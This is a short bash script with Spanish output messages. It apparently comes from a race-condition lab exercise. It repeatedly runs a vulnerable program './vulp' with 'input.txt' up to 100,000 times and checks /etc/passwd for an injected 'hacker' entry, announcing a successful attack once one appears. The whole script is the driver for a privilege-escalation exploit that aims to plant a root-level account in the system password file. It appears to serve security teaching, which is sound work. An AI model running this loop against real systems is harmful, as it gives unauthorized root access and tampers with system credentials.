#!/bin/bash

for i in {1..100000}
do
    echo "Intento #$i"
    ./vulp < input.txt 2>/dev/null || true

    if grep -q hacker /etc/passwd; then
        echo "✅ ¡Ataque exitoso en el intento #$i!"
        grep rooted /etc/passwd
        exit 0
    fi
done

echo "No se logro el ataque"
